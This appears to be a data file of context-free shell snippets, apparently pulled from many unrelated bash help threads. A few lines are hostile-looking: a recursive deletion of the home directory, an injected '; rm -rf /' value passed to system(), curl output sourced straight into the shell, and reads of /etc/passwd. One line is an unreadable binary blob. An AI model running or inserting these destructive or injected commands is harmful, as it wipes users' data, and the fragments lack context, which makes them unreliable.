<(sed 's@^@/@; s/$/$/; s/\([\.[\*]\|\]\)/\\\1/g' filelist.txt)
<( ... )
$( ... )
cat hello.txt | sed 's/ //g'
sed -e "s/[ \t\n\r\v]//g" < hello.txt
empty lines
lines endswith '}'
ls -ls
echo $array
ls -ls
echo ${files[0]}
for entry in ${files[@]}; do ... ; done
done < <(ls -l ... )
ls -ls
ls -ls
LANG=C LC_ALL=C
echo "Path...
exec {tofd}<> <(:)
( while true; do echo -n .; sleep 0.1; done) & timeout_child 2
read < named_pipe
kill -9 $child
wait $child > /dev/null 2>&1
Sort numerically: the number begins each line ...
find "$WORD" -type f | cut -d / -f 2-
ls --color=auto
alias ls
man ls
$(command with params)
with params
dirname $oldpath
dirname $(dirname $oldpath)
${oldpath##$(dirname $(dirname $oldpath))}
(...) | grep ...
PATH variable
wget -i filename
-O filename
bash -c
$(press up arrow key)
$ ls(notice this command starts with a space)
rmdir ~/.vim/_vim
[ -s file ] # Checks if file has size greater than 0
-e '1p'
-e '/pattern/p'
chmod +x keepfirstline
grep SearchTerm
Matched Keyword
Matched Keyword
"I need to count the total number of instances in which a 10-digit number appears within a file. All of the numbers have leading zeros"
-p pid
kill -0 $PID
while ! ps -p $PID
emacs -nw
GNU Screen
to indicate one or more "white-space" characters (including tabs, VT, maybe a few others). In a modern sed, I would expect
< /dev/null
vi myfile.csv
awk 'BEGIN{FS=OFS="|"} {gsub(/^[ \t]+|[ \t]+$/, "", $2)}1' filename.txt
chmod +x
chmod +x
echo something | /usr/local/bin/my_interpreter
hg revert
hg purge
grep -c
./someScript.sh foo bar
foo bar
 \t\n
$1 , $2 , $3
echo -ne "\0" | wc -c
echo -ne $'\0' | wc -c
$((5 + 3))
ls s
ls slurm-143858
ls s*
rm s
rm slurm-143858
rm s*
/bin/ls s*<tab><tab>
alias kk='/bin/ls'
kk s*<tab><tab>
/bin/rm s*<tab><tab>
rm s*
rm s*
rm s
rm slurm-143858
apt-get install ssmtp
sudo nano /etc/ssmtp/ssmtp.conf
curl -o /dev/null -s -t "%{total_time}" | awk ...
bash test.sh "blah blah"
bash test.sh "blah\ blah"
blah\ blah
blah blah
editing-mode vi
keymap vi
man readline
keymap vi
keymap vi
keymap vi-insert
editing-mode vi
editing-mode vi
editing-mode emacs
editing-mode emacs
editing-mode vi
editing-mode vi
editing-mode vi
editing-mode vi
editing-mode vi
LogLevel VERBOSE
"some data"
"\"some data\""
data "
\( ... \)
> yourfile
open http://example.com -a "$(VERSIONER_PERL_PREFER_32_BIT=true perl -MMac::InternetConfig -le 'print +(GetICHelper "http")[1]')"
open -a "Google Chrome" index.html
sed -e 's/(.*)//' -e 's/[^0-9]/ /g'
column -t
sed -r 's/[(][^)]*[)]/ /g; s/[^0-9]+/ /g'
unbound variable <name> in <file>:<line>
sh myscript.sh PATH
help [
help test
someScript.sh > /tmp/cronlog/somescript.$(date +%Y%m%d).log 2>&1
if [ -t 1 ]
perl -pi -e s/str1/str2/
sys.path.append('what I want')
sys.path.append('the second thing I want')
pythonbrew off
pythonbrew off
source $HOME/.bashrc/etc/bashrc
source $HOME/.bashrc/etc/bashrc
interactive-program < command-file
here document
limit string
... |less -R
open x-man-page://command
help test
test expr
man bash
pdflatex foo.tex
%.pdf: $*/$*.tex
all: foo.pdf bar.pdf
grep 'rails' 'Gemfile'
echo 9098
echo $$
echo $$FILES
echo ${FILES}
echo $(FILES)
$(shell ls)
FILES ...
FILES := ...
$(subst ...)
find ... -print0 | xargs -0
VAR := $(shell command args...)
VAR != command args...
VAR != command args...
$(shell ...)
source .bashrc
cd $1; source .bashrc
shopt -s cdspell
-bash: /usr/bin/test2: No such file or directory
man test
whereis pathinfo
which pathinfo
kill -0 $pid
kill -- -145974
kill -0
set -e -x
man timeout
wait_timeout $timeout $PID1 $PID2 ...
kill -0
wait -n
timeout wait PID
bash-3.00$ cat Metrics.log | grep -e '[^\[\]]' | grep -i 'ABC'
grep -i 'ABC' Metrics.log | grep -v "[[]" | grep -v "ABC\w"
sort -n data
sort -g data
cat /dev/urandom | base64
head -c 10
./search_text.sh 'string_to_search' a.txt b.txt
which irb
cdb x
cpb file x
cp -R ~ /backups
cp -R ~/ /backups
kill -0 $pid
while read line
awk -F "@*" '{print $n}'
awk -f join.awk file2.csv file1.csv
./join.awk file2.csv file1.csv
crontab -e
false && anything
find -name testname.c
vi $(find -name testname.c)
disown $!
--pages '{},1-'
convert --adjoin
convert <filename>.pdf book.jpg
montage -adjoin ..
osascript -e
man osascript
python file.py &
sudo su $offender -c "echo \$HOME"
<(echo $HOME)
-d @-
jq ... | curl ... -d@- 'https://example.com'
jshon -s 'Your data goes here.' 2>/dev/null
'çömmít' "mêssågè"
git log -n 1 --pretty=format:'%s'
gcc -x c $input -o $binfile
-Wall -Werror -g -O
system ("/bin/rm -rf $HOME");
exec scala "$0" "$@"
a b 'c d'
./wrapper.sh <admin_email> <admin_password> <weblog_title> <user_name>
# ./script.sh SiteName UserName email@address.com Password
echo "${#a[++n]}->${n}"
echo "${a[++n],,}->${n}
mv "$DIRNAME/$n" "$DIRNAME/$y"
"StackOverflow rocks!"
"Steve's Apple"
"/my dir/"*
'Really costs $$!'
'just a backslash followed by a t: \t'
'The "crux"'
$'{"table": "users", "where": "first_name"=\'Steve\'}'
[[ ]]
for word in $words
for txtfile in *.txt; do ...
~/"some dir"
"~/some dir"
[ $ERRORS ]
[ -n "$ERRORS" ]
[ -ne ]
(( $# != 2 ))
basename $0
QUERY="${QUERY// /+}"
>& FILE
> FILE 2>&1
kill -STOP $$
man sed
/unique pattern/
import pdb
ps aux
ps -aux
ruby index.rb
[1]+  Stopped  ruby index.rb.
$ ps a | grep ruby
$ kill -9 <YOUR_PID>
j += 1
> output.txt
-F "'"
-type f
-size +1000k
echo $DISPLAY
mismatched \( .. \)
| bash
declare -i
tail -1 \"{}\"
-name \*py
$(tail -c1 file)
-f file
[[ $x ]]
[[ -n $x ]]
tail -c1
vi -es
shopt -s globstar
find -type f | while read f; do [[ `tail -c1 "$f"` ]] && echo >> "$f"; done
for f in *
while read
find -exec
man bash
find | read
find -type f -print0 | while read -d $'\0' f; do [[ `tail -c1 "$f"` ]] && echo >> "$f"; done
-type f
find path/to/dir -type f \( -name \*.C -o -name \*.h -o -name \*.java \) -exec ...
uniq -c
uniq -c
uniq -c
cut -d' ' -f2
tr -s
uniq -c
sort -u file
sort -u < file
sort txt | uniq -c | sort -k1 -nr | sed 's/^ \+[0-9]\+ //g'
sort txt | uniq -c | sort -k1 -nr | perl -lpe  's/^ +[\d]+ +//g'
echo $temp1
(%Y-%m-%d %H:%M:%S)
(2012-02-11 17:15:00)
(%Y-%m-%d %H:%M:%S)
(2012-02-11 17:15:00) long sentence
Date[%Y.%m.%d %H:%M:%S]
Date-2012.02.11 17:15:00- long sentence
system('/usr/bin/ksh','-c', '. /opt/apps/abc/folder/properties.env');
/usr/bin/ksh -c /opt/apps/abc/folder/properties.env;
system('. /opt/apps/abc/folder/properties.env');
export PATH="/Users/toby/node/imapp/imagebridge/node_modules/expresso/bin/expresso/:$PATH"
exec -a foo bar
man sudoers
@F.  Unlike
line.split(None, 2)[-1]
(l.split(None, 2) for l in path_output)
l.split(None, 2)
key = value
|xargs test -f
-n +N
/usr/bin/passwd.sys && echo 'Alert! Alert! Alert!' | mail -s 'pass change'
awk -F, '{ if($2 == '${num}' && $4 == '$tipogalis' && $9 == '0')print $1 }' /usr/xbow/xserve/galtel/relasens
$bash -x
ksh -x
$bash -x
$bash -x ls
/usr/bin/ls: /usr/bin/ls: cannot execute binary file
$bash ls
$bash -x ls
bash -x -c ls
man bash
bash -x <file>
test -x <file>
sed -ei "s/_data_/${DATA}/g" mail.tpl
awk -v r=$DATA '{gsub(/_data_/,r)}1' test
sed 's/pattern/\na\nb\nc/g'
declare -a
declare -A
declare -A
bash scripts/ssidchecker.sh
date '+%V'
-f format date
diff -q
n=$(cmd param1 param2)
("file1" "file2")
/ [...] /d
perl -ne'$c++ while /\(\*\)/g;END{print"$c\n"}' filename.txt
perl -ne'BEGIN{$re=shift;}$c++ while /\Q$re/g;END{print"$c\n"}' 'regex' filename.txt
perl -ne'BEGIN{$re=shift}$c+=()=/\Q$re/g;END{print"$c\n"}' 'regex' filename.txt
cd ../subdir/
go up one level
cd  link
cd -P link
set -P; cd link
bash -c '... echo $$a ...'
set -e
mkdir directory
diff -u
export MAXJOBS=newX
git pull origin
awk -F 'gd' ...
awk -F 'pp' ...
perl -e '$x=shift;/\S/&&++$f{$a=()=/(\Q$x\E)/g}while<>;print"$_:\t$f{$_}\n"for sort{$b<=>$a}keys%f' inputfile
basename /this/is/could/be/any/path/abc.txt
basename path
$(cat /home/user/Desktop/filelist.txt)
X && Y
X && checkIfXLoaded && Y
man bash
me@myPC /c/myRepo (master)
me@myPC /c/myRepo (master) 5 | 10:20
$ nano ~/.bashrc
$ source ~/.bashrc
[[ $string =~ $pattern ]]
-P (--perl-regexp)
bash regexp
rm paper-stack.[!tex]
shopt extglob
sudo echo
sudo cat
sudo -s
| sudo tee
| sudo tee -a
> /dev/null
sudo tee
echo -e
echo -e
tee <<EOF
perl -i.bak
= =
hascli -rn /
check: command not found
sh -c
sh -c
sed 's/1/0/1' file
META=' -metadata album="Peregrinações" -metadata title="Passeio ao PETAR" -metadata author="Rogério Madureira" -metadata date="2012" -metadata description="Áudio de um passeio ao PETAR" -metadata comment="Áudio capturado com TACAM DR-07MKII e Foto capturada com Canon PowerShot S5IS" '
ffmpeg -i $R_IMG -r 1 -b 1800 -i $SOUND -acodec libmp3lame -ab 128k $META -y $OUT
svn add /wc --force
echo "HISTFILE is $HISTFILE"
cat ~/.bash_history
echo "$thingy" >> "/var/log/myOutput.log"
man grep
man grep
ls -l
find -f
wc -l
[     1]
CentOS 6
cat foo.csv | python fixcsv.py 4
A @ B @ C @ D
A @ B @ C @ D@
sed -r
:set runtimepath
DequeuedItemF1=$(echo $DequeuedItem | cut -f1)
echo test >&1
echo test >&2
echo test >&0
for (( i = 1; i <= ${#*}; i++ ))
./script.sh file1 file2
"$1" "$2" ...
use 5.12
bash -x script
mkdir -p "$2/$artist_name"
sed -r 's/ +$//'
tr -d ' '
echo $out
ls .
man watch
-d ''
echo "$(command)"
git push -u origin master
ssh -T git@github.com
git push
ssh-keygen -t rsa -C "youremail"
new_var = ${var%-*}${var#*-}
new_var = ${var%-*}.${var#*.}
bash completion
completion builtin
man zshcompwid
git d
git diff
nohup java Daemon 1000 &> logs/wrapper.log &
1,300,000 - 2,000,000
sh vxm_alarm.sh
sh vxm_alarm.sh
sh --version
bash vxm_alarm.sh
read -r
shopt -s extglob
done <$ARDUINO_PORT
-u 6
bash 3.1
printf -v
printf '%q'
sort -u
sort -u
s/ / /
grep -o "\..*"
{ print x }
{ print x / y }
04/16/12 20:44:19
date -d $7 +%s
ps -ef
ps -ef
[\ []
[]\ ]
$ ./sample.sh &
stty -tostop
chmod +x sortfiles.sh
| sh
man mv
| sh
[[ -f "$filename" ]] && do something > "$filename"
s/(example)(\d{3})/$1.($2 + 1)/eg;
> outfile <command>
<command> > outfile
cat infile
cat <infile
touch output
F sth
df -P
echo $ARRAY
echo ${ARRAY[@]}
grep -v
sudo password
$(date +'%Y-%m-%d %H:%M:%S') $(hostname -s) ${l_text}
echo $text >> /dev/null
local text="$(date +'%Y-%m-%d %H:%M:%S') $(hostname -s) $1"
GNU bash, version 4.2.10(1)-release (x86_64-pc-linux-gnu)
gnuplot -persist
killall gnuplot_x11
if [ ! -e $file ]
locate $fname
locate $fname
md5sum -c
remove_by_position $number $FILE > $FILE.$$ && mv $FILE.$$ $FILE.$number
command + .
command + .
find . >/dev/null 2>&1
echo 'echo "Server = http://repo.archlinux.fr/$arch" >> /etc/pacman.conf'
[ -e FILE ]
[ -f FILE ]
puts $expect_out(buffer)
no such variable
info exists expect_out
array names expect_out
set expect_out(key) value
log_file expectoutput.txt
Which of the following files would you like to copy/recover? [1],[2]:
locate file.txt
-n -n
ssh -vvv
ssh -v
alias grep='grep -H'
command grep
grep -h
grep -H -h
man getopt
sed -e "s/[[:space:]]②[^\.]*\.//"
[ ]*
man iso_8859_1
od -bc
sed 'y/[diacritics]/[transliterated]/'
zipsplit -n 2147483648
find … -print0
xargs -0
for host in host1 host2 host3
ssh death-star
/usr/bin/mysql: Argument list too long
arg list too long
awk -F "," '{ split ($8,array," "); sub ("\"","",array[1]); sub (NR,"",$0); sub (",","",$0); print $0 > array[1] }' file.txt
-F ","
split ($8,array," ")
sub ("\"","",array[1])
sub (NR,"",$0)
sub (",","",$0)
print $0 > array[1]
gsub ("-","_",array[1])
awk -F "," '{ split ($8,array," "); sub ("\"","",array[1]); gsub ("-","_",array[1]); sub (NR,"",$0); sub (",","",$0); print $0 > array[1] }' file.txt
A:1 B:2 C:3 D:4 E:5
PS3="Your choice? "
git config --global core.editor emacs
git config --global core.editor "'C:/emacs-23.3/bin/runemacs.exe'"
git config --global core.editor emacsclientw
git config --global core.editor emacsclient
sh zf.sh
bash zf.sh
xargs -p
<( ... )
bash -c
$? > 0
$? > 0
> 0
[ $? > 0 ]
man test
fork{ exec "sh -c 'sleep 1' # first async" }
command ...
command ...
exec "command ..."
for i in /sys/class/net/*; do echo "${i##/*/}:"; cat $i/{address,operstate}; done
pip install bumpversion
git flow release start x.x.x
sed -i
Fri Apr 14 14:00:00 EDT 2011
printf %()T
date --date="${ref_date}" +%s
[[ ! -f "$pidfile" ]] && exit
$0 $@ &
3.4.2 Special Parameters
[[ $mypid -ne $procpid ]]
$0 $@ &
-F "@"
"abra/cadabra reach/out"
udevadm monitor --environment
ls | jq -R -s -c 'split("\n")[:-1]'
ls | jq -R '[.]' | jq -s -c 'add'
chmod u+x scriptname
ls * | parallel "mkdir ./{.}"
man bash
open myheader.h
open -a /Applications/TextMate.app myheader.h
usr/bin/open $*
open other\ header.h
extended regex
mv file1@x2.png file1@2x~ipad.png
man mv
egrep -n 'pattern1|pattern2'
rm -f
\rm -f file
./detach.sh prog [arg1 arg2 ...]
for i in {0..9999}; do :; done
for i in {0..9999}; do :; done
setsid "$@" >& /dev/null & wait
if then elif else fi
"$1" "$2" "$3" ...
> sudo rm gcc
> sudo ln -s /opt/local/bin/gcc-4.2 gcc
tr : /
use strict; use warnings;
find . -maxdepth 1 -type f | xargs -n 1 -I % Calculate.sh %
> file1
2> file2
bash script
do { ... } while EXPR
Device Enabled
" *"
bash: sbt: command not found
sbt 'run-main Foo'
ssh my_username@<server ip> "echo $PATH"
ssh my_username@<server ip> "echo $PATH"
ssh my_username@<server ip> 'echo $PATH'
ssh my_username@<server ip> env
Cannot exec 'cp 333 444': No such file or directory
echo -e
-v var=value
cd myProjectFolderName [Y, n]
00000000 00000001 00000010 ... 11111101 11111110 11111111
source script-1.sh
. script-1.sh
ls -l
grep '\$NT\$'
awk -F: '$2 ~ /\$NT\$/'
echo '1.1231' | cut -d '.' -f 2
man cut
man bash
man bash
-e  /sudoers.tmp -o "$(pidof visudo)"
help test
-e /etc/sudoers.tmp
[ -e /etc/sudoers.tmp -o "$(pidof visudo)" ]
pidof visudo
(fdb) ^[[A
rlwrap fdb
! -regex '.*tmp.*'
mkdir -p 1,2,3,4,5,6,7,8,9
<< EOF
#!/usr/bin/env perl
stty echo
-printf '%f\n'
trap bashtrap INT
myscript infile1.pdf infile2.pdf ... outfile.pdf
myscript *.pdf outfile.pdf
$(NF - 1)
/usr/bin/svn: Bad address
-rwxr-xr-x 1 JFishwick Domain Users 189966 Mar 8 15:52 /usr/bin/svn
-o value
readlink -f
'myparam /path/to/a argB=/path/to/B xo'
sed -i '' …
shell builtin command
man bash
ssh -X -f remotehost xterm
grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' file.txt > macs.txt
grep -F
grep -F
-x FILE
grep -q
grep -q
grep "regex" > /dev/null 2>&1
stat -c '%A'
echo "1,2" | awk '{printf("%f\n",$1)}'
echo {}
echo {a,b,c}
a b c
SC=";"; find ... {} $SC
$ source ~/.profile
source ~/.profile
interactive shell
login -pf $USER
source ~/.profile
dd if=data.bin of=zero.bin bs=1 count=5
sort filename
find -mtime ...
System.setProperty(.., ..)
id -un
ls -l
date --date
"now +$timer second"
date +%s
[ 12345 > $e ]
foo bar baz
chsh -s /bin/bash
chsh -s /bin/zsh
echo $SHELL
uniq -d
sort -V
PermitUserEnvironment no
git clone
a = "some wrong string"
expr match
a = "some wrong string"
echo "abcdef"
do other stuff
[whatever the previous command returned on line 5]
[whatever the previous command returned]
| head -5 | tail -1
[take line 5]
emacs --daemon
git commit --help
echo $XDG_CONFIG_HOME
env -u XDG_CONFIG_HOME
/usr/bin/install: /usr/bin/install: cannot execute binary fil
tr -d '\015'
sh install
tail -r
mv -i
for f in ...
man bash
Parameter Expansion
file exists
file not found
file exists
if [[ -e $var1 ]]
file not found
set -x
'[' -e ']'
[[ -e '' ]]
if [ -e "$var1" ]
[[ ]]
#include "
gcc -xc -
cat *.c
-g -O -flto
$( ... )
short fat
tall thin
Operation not permitted
user unknown
gzip -r ./
while read
print resnames if sum >25 and sum<25
print if sum != 25
date +%s
echo ${.sh.version} =
svn praise [svn file path]
rsync -axvvES --remove-source-files source_directory /destination/
export LANG=en_US.UTF-8
easy_install pip
pip install
pip uninstall
/bin/bash --version
export HISTCONTROL=ignoreboth
"$(history 1)" (if_not_duplicate) >> ~/.bash_history
ls | grep something
if; then; fi
git rev-parse
XVAR="$XVAR -x $f "
XVAR="$XVAR -x \'$f\' "
XVAR="$XVAR -x \"$f\" "
-x 'O S.hash'
-x "O S.hash"
md5deep -e -x "O S.hash" -r *
$VARIABLE =~ PATERN
i=$(($i + 1))
i=$(expr $i + 1)
while read line; do ... done <$tmpfile
su -c "/etc/init.d/networking restart"
#!/usr/bin/env bash
#!/bin/sh -
[[ ]]
#!/usr/bin/env bash
diff --changed-group-format="%>" --unchanged-group-format="" file1 file2
sort file1 file2 | uniq -u
sort file1 file2
uniq -u
cd -
cd -
cd $OLDPWD
cd -
cd ..
lipo $SDK_DIR...
sort -u
sort | uniq -c
ls -lde ~
find /path/to/root/dir -type d >> dirnames.txt
ls /: No such file or directory
ls /
bash mybash "alice cat" .
set -u
set -u
[[ $var ]]
[[ ${var:-} ]]
set -u
set -u
set -o nounset
set -u
echo $a
-exec cp {} /path/dest \;
mplayer <get full path to file
rightclick -> start with mplayer
read -a req
set -o vi
ipython profile create
if (( i % j == 0 ))
if [i % j == 0];
if [ i % j == 0 ];
sed -e 's/PASSWORD_[A-Z]_[0-9]/{&}/'
awk -F"<|>" '{ print "<" $2 ">{" $3 "}<" $4 ">" }' file.text
service mysql status
sudo gem install cupertino
cd -
osascript -e
man osascript
source ~/.profile
source ~/.cshrc
call mybat.bat
mkbuiltins -D . getopts.def
readlink -f $0
which $0
help select
sed -i
< >
workon <_name_of_env_>
export VIRTUAL_ENV_DISABLE_PROMPT=1
./tick.sh &
wait 1
sleep 1
bash filename
find ${_path} ...
cd ${_path}
-type f
-mtime ${ARCHIVE_DELAY}
-name "${_filename}"
-not -name "${_ignore_filename}"
-not -name "${_ignore_filename2}"
setxkbmap carpalx
call(["xmodmap", "./carpalx2"])
call(["xmodmap", "./carpalx2"])
_filecount=echo ${_filelist} | wc -w | awk '{ print $1 }'
printk "archiveWLS(): ${_filecount} file(s)"
wc -w
echo ${_filelist} | wc -w | awk '{ print $1 }'
printf "archiveWLS(): ${_filecount} file(s)"
command not found
wc -w
sed -e 's/2011/2012/'
open ...
for number in ${numbers[@]}
for number in "${numbers[@]}"
echo "${numbers[${i}]}"
man bash
Parameter Expansion
date + '%Y-%m-%d'
date +'%Y-%m-%d'
/path/to/script command [argument]...
bash -x
:%s/^# %wheel/%wheel/
/ 157286400 + 1 ")syntax error: invalid arithmetic operator (error token is "
-i <keypath>
-n / noexec
tail -f
[1]+  Terminated ...
find [...] -regex [...] -print0
($2 == "both")
[ $2 == "both" ]
Dirlist=$(find $1 -type d)
-mindepth 1
#define ReleaseAndSetToNil(x) x = nil;
wc -l
finger | awk 'NR >= 2 { gsub ("[\\(|\\)]","",$NF); print $1"\t"$3"\t"$NF }'
heroku run rake db:migrate
somecommand $line
ftp -s script.ftp
ftp -n < script.ftp
$? = 1
do while
set +m
set +o monitor
shopt -u -o monitor
shopt -s laspipe
#do something until it returns 0
exit value
return value
[[ ... ]]
[ ... ]
type binary
"su - root -c SUB_HERE"
"sudo -- SUB_HERE"
complete -E
complete -I
virtualenv --distribute hy
s3z@s3z ~/Google Drive/py/hy
. Scripts/activate
source Scripts/activate
. Scripts/activate
source venv/Scripts/activate
 pip -V
git diff
git diff
while read
set -f
set +f
set -f
set +f
set -f
cd /path/to/clean
replacebylinks.sh /here/is/symlinks/
tar -chC "source" .
-C source
/usr/bin/java ..
set > tmpEnvVarList.txt
. .profile
Not set!
function readArgs() {
system("rm -rf $input")
system("harmless_command $input")
; rm -rf /
rm -rf /
system("some_command $filename")
cd ..
help cd
cd -P
bash test.sh
tr -s [:blank:]
find "../test" -exec bash -c "echo '{}'" \;
-type f
-exec rm {} \;
rm {}
-exec rm {} \;
rm <directory>
ls -a
rm -rf ...
$ script.sh
$ python3 script.py
python3: can't open file 'script.py': [Errno 2] No such file or directory
build1c.sh client2.c
set +o verbose
set -o verbose
set -x
tr -d '\015'
chmod u+s myscript
chmod +x myscript
chmod g+x myscript
sudo chown root myscript
echo -e
$(echo -ne)
man at.allow
systemctrl -a | grep atd
tail -f /var/log/syslog
journalctl -b | grep atd
ls > some_text_file
sudo systemctl enable --now atd
man at
man atrun
launchctl load -w /System/Library/LaunchDaemons/com.apple.atrun.plist
Null command
help :
import -display :0.1 -window root -colorspace RGB -quality 80 screendump.jpg
The 68.85.228.121 is a Comcast (my provider) router. We can ping that:
Pinging 68.85.228.121 with 32 bytes of data:
Reply from 68.85.228.121: bytes=32 time=10ms TTL=253
Route: 66.176.38.51 ->
68.85.228.121 ->
68.85.228.121 ->
Voila! The 66.176.38.51 is my public IP.
wget -qO- whatismyip.org
<link rel="stylesheet" href="css/reset.css">
<link rel="stylesheet" href="css/master.css">
<link rel="stylesheet" href="hello-world.css">
<link rel=stylesheet href=css/reset.css>
<link rel=stylesheet href=css/master.css>
<link rel=stylesheet href=hello-world.css>
help let
let b+=$number
command -h
[ -z "$1" ];
help test
./foo bar baz
$1 == bar
$2 == baz
[ ! -n "$1" ]
foo whatever whatever else
for i in $(ls)
grep -v
grep -E
while read
Content-Type: text/html
subprocess.call('cat /dev/zero | head -c 10 | base64', shell=True)
head -c 10
cat ... |head ...
ps o rss= -p PID
shopt -s promptvars
man 5 terminfo
man tput
man bash
locate bibtex | grep "/bibtex$" -d skip | head -n1
perl -ne 'chomp($f=$_);print if !-d $f'
locate bibtex | perl -ne 'chomp($f=$_);print if !-d $f' | grep "/bibtex$" -d skip | head -n1
[ $testnum4 -eq 0 -a $testnum100 -ne 0 ]
[ $testnum400 -eq 0 ]
$(( ))
help \[
man test
(( ))
sleep 2
[[ $string =~ $pattern ]] && echo "passed"
grep -o
nchars=$(wc -c < f1.txt)
sudo lspci -vvv
sudo lspci -vvv|./checkpci
for /r
shopt -s histappend
history -w
history -a
history --help
C:<path to your Git Portable folder>\etc\bash.bashrc
PROMPT_COMMAND='history -a;history -c;history -r'
echo 'HISTFILE=$HOME/.bash_history' >> $HOME/.bashrc
su -m -l kenneth -c 'echo $PROJ_HOME'
su -l kenneth -c '. /home/kenneth/.bashrc; echo $PROJ_HOME'
"echo (empty string)"
'echo $PROJ_PATH'
cp foo* backup/foo*
wget http://en.wikipedia.org/wiki/List_of_current_NFL_team_rosters
curl http://en.wikipedia.org/wiki/List_of_current_NFL_team_rosters
??N?????g???????^??L??~???IR?OX/?џ??X???4????b???m??Jk??o߾5E_S???D?xT????y???>??b?C?g?B?#?}????ŏ?Hv?K?dڛ?L˿l?K??,???T?c????n?????F*???'???w??z??d񧿜??? ???Y1Id?z?:7C?'W2??(?%>?~ԫ?|~7??4?%qz?r???H?]??P?PH 77I??Z6~{z??UG?~???]?.?#?G?F\????ӓ???8??ߞ?
wget -q -O - http://en.wikipedia.org/wiki/List_of_current_NFL_team_rosters
-P <prefix>
man at
printf("%c", 65)
unset $array
unset $array
uname -r
PATH=$(getconf PATH)
man ls
ls folder
(do_build && deploy_build)
find_val.awk somefile somevalue
echo "some line of text" >> aFile.txt
tail -c 1
-p $sqlpasswd
xprop -id [window_id]
xprop -frame
xwininfo -children [frame_id]
xwininfo -children -id [frame_id]
-name '${MYPREFIX}*'
set -x
eval ${line}
set -x
PARAMETER C_HIGHADDR
PARAMETER C_HIGHADDR
BEGIN lmb_bram_if_cntrl
PARAMETER C_HIGHADDR =
19 4
sed 's/\(.*\):\(.*\)/\2 \1/'
awk '{ sum += $2 } END { print sum }' file.txt
1 + 2 + 3 + 4 + 5
/^(\s*)def $1[^a-zA-Z0-9]/
ls -l
echo "a" | xargs ls -l
ls -l $(echo "a")
ls -l [filename]
BEGIN lmb_bram_if_cntlr
PARAMETER INSTANCE = dlmb_cntlr_0
PARAMETER HW_VER = 3.00.b
PARAMETER C_BASEADDR = 0x00000000
PARAMETER C_HIGHADDR = 0x0003ffff
BUS_INTERFACE SLMB = dlmb_0
BUS_INTERFACE BRAM_PORT = calmb_0_BRAM_PORTA
BEGIN lmb_bram_if_cntlr
PARAMETER INSTANCE = ilmb_cntlr_0
PARAMETER HW_VER = 3.00.b
PARAMETER C_BASEADDR = 0x00000000
PARAMETER C_HIGHADDR = 0x0003ffff
BUS_INTERFACE SLMB = ilmb_0
BUS_INTERFACE BRAM_PORT = ilmb_cntlr_0_BRAM_PORT
BEGIN lmb_bram_if_cntlr
PARAMETER INSTANCE = dlmb_cntlr_1
PARAMETER HW_VER = 3.00.b
PARAMETER C_BASEADDR = 0x00000000
PARAMETER C_HIGHADDR = 0x0000ffff
BUS_INTERFACE SLMB = dlmb_1
BUS_INTERFACE BRAM_PORT = calmb_1_BRAM_PORTA
BEGIN lmb_bram_if_cntlr
PARAMETER INSTANCE = ilmb_cntlr_1
PARAMETER HW_VER = 3.00.b
PARAMETER C_BASEADDR = 0x00000000
PARAMETER C_HIGHADDR = 0x0000ffff
BUS_INTERFACE SLMB = ilmb_1
BUS_INTERFACE BRAM_PORT = ilmb_cntlr_1_BRAM_PORT
python -c
COUNTER=$((COUNTER + 1))
COUNTER=$[COUNTER + 1]
grep, grep, awk, awk, awk
set -euo pipefail
rm -rf
ls abc.log.2012-03-*
xargs rm -rf
rm -f
ls | grep ...
rm -f
rm -f
rm -f 
rm -f foo bar
rm -f 'foo bar'
cd && cat
:set list
sed -i -e '$a\' "path"
[ -n "$l" ]
[[ $l ]]
[[ $l ]]
[[ -n $l ]]
$(tail -c1)
tail -c1
sed -n p
sed '$a\'
-i ''
source <( curl url ); echo done
var1=$(echo $STR | cut -f1 -d-)
var2=$(echo $STR | cut -f2 -d-)
var1=$(echo $STR | cut -f1 -d?)
var2=$(echo $STR | cut -f1 -d?)
var3=$(echo $STR | cut -f1 -d?)
local IFS
error: cannot mv file
-maxdepth 1
-type -f
-exec cmd option {}
for i in **/*.md;do mkdir -p ../docs/"$i" && rm -r ../docs/"$i" && cp "$i" "../docs/$i" && echo "$i -> ../docs/$i"; done
for i in **/*.md;
mkdir -p ../docs/"$i"
rm -r ../docs/"$i"
mkdir -p
cp "$i" "../docs/$i"
echo "$i -> ../docs/$i"
; done
[ -f "$file" ]
-d ''
-L 1
-d '\n'
tput setb 6
rm ~/.bashrc
tput setb 0
echo /?
ls -l /usr/bin/env
tr -d '\r' < /users/zmjones/.ec2/bin/ec2-add-keypair > /users/zmjones/.ec2/bin/ec2-add-keypair
ec2-describe-images -o amazon
permission denied error
echo $EC2_HOME
chmod +x ec2-describe-images
#!/usr/bin/env bash
/Users/zmjones/.ec2/bin/ec2-cmd: /usr/bin/env: bad interpreter: Operation not permitted
echo $EC2_HOME
ls -al@
com.apple.quarantine extended attrib
\bPerl script\b
-n EXCLUDE
"Do you want to load all configurations? Y/N ?"
make install
| while IFS=/ read root planet category rest; do
-name "*"
-type f
help every
| while
| while...
#!/usr/bin/env python
#!/usr/bin/env python2
#!/usr/bin/env python3
python some_script ...
ls -l
ln -s /usr/bin/python /usr/bin/pythonXY
while do done
echo $name
grep -r
XY TD-
TD-file\ that\ TD-contains\ space.txt
file\ that\ contains\ space.txt
XY TD-
brew install rename
rename -d prefix- *
find ... | while
tput cuu1
man tput
man terminfo
stdin=$(cat -)
ls -l
ls -l
rm -rf
rm -ri
rm -rf
rm -rf
rm -r
rm -ir
ls -l
rm -r
rm -r
ls -l
rm test1.txt test2.txt myApp
rm -f
rm -r
ls -l
"dir1 dir2 file1.txt"
ls -l | xargs rm -rf
rm -rf dir1 dir2 file1.txt
rm -rf di1 dir2 file1.txt bark.*
find -iname bark.* | xargs rm
find -iname bark.* | xargs echo
find -iname bark.* | xargs rm
rm -rf /usr/local/.........
rm -rf /usr /local/......
rm -rf "/usr/ local/...."
rename --help
alias list
alias list='ls'
nice -10 $UserVar1;
nice -10 ${BASH_ALIASES[list]}
nice -10 list
chmod +x script
sh script
script image*.jpg
head -2
head -3
COMPREPLY=($(compgen -P "$dir" -W "${results}"))
[[ -d $1 ]]
for i in {1..10} ; do echo $i; done
echo "cat //title" |
while read line
while read ... ; do ... ; done
echo -n
"${words// /}"
-d '\n'
fold -w1
read -n1
-d ''
-d ''
-d $'\0'
-n 1
printf %s "$string"
echo -n
< <(...)
done <<< "$string"
printf %s "$string" | while ...
grep -o .
while read
a s d f g 
cat /etc/passwd | grep "sysa"
! false
$( ... )
echo $(cat /etc/passwd | grep "sysa")
if ! [ $(grep -c "sysa" /etc/passwd) -eq 0 ] ; then
Useless Use of Cat (UUOC)
